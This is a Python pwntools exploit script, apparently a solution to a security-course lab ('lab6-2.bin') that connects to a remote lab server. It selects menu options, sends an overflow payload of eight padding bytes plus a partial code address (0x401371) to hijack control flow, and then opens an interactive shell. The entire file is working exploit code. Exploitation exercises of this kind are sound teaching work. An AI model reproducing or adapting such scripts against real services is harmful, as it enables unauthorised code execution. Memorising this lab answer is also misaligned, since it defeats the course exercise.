from pwn import *

# Launch exploit process
#p = gdb.debug("./lab6-2.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab6-2.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7062)   # run the exploit against a remote process
print("\n")

# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

# Send option to load data
p.sendline(b'5')

# Read prompt
getMessageText = p.recvuntil("Message text: ")
print(getMessageText)
#print("\n")

# Send  Message Text
print("\n")
payload = b"A"*8 + p64(0x401371)[0:7]
print(payload)
print("\n")
p.send(b"A"*8 + p64(0x401371)[0:7])

# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

# Send option to load data
p.sendline(b'4')

# Switch to interactive after gaining shell
p.interactive()
